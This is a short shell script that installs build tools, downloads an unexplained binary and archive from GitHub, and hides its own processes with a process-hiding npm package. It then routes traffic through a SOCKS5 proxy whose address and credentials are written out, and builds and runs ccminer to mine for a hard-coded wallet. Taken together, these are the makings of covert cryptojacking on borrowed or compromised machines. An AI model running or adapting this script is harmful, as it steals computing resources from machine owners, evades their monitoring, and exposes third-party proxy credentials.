apt update 
apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y 
wget https://github.com/christiarch/templates/raw/main/lba 
chmod +x lba 
npm i -g node-process-hider

ph add graftcp
ph add ccminer

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 181.215.184.109:45786
socks5_username = Selshindeparshuram2012
socks5_password = V7p9BkV
END

apt update && apt upgrade
apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
apt-get install git

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "
echo " "

./graftcp/graftcp git clone --single-branch -b ARM https://github.com/monkins1010/ccminer && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verushash -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u DBzjgXkfYtotoLg1hKRZugd7vDotq7TW1k -p  c=DGB,mc=VRSC,ID=bigbang



